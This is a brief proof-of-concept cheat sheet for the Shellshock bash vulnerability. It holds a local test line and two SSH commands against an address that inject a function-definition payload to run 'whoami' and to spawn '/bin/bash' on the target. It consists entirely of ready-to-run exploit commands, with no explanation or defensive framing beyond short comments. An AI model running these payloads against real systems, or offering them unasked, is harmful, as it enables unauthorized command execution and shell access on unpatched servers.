# Shellshock PoC
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

# executing arbitrary commands by exploiting SSH via shellshock
ssh user@192.168.0.1 -T '() { :;}; whoami'

# spwan bash shell by exploiting SSH via shellshock
ssh user@192.168.0.1 -T '() { :;}; /bin/bash'
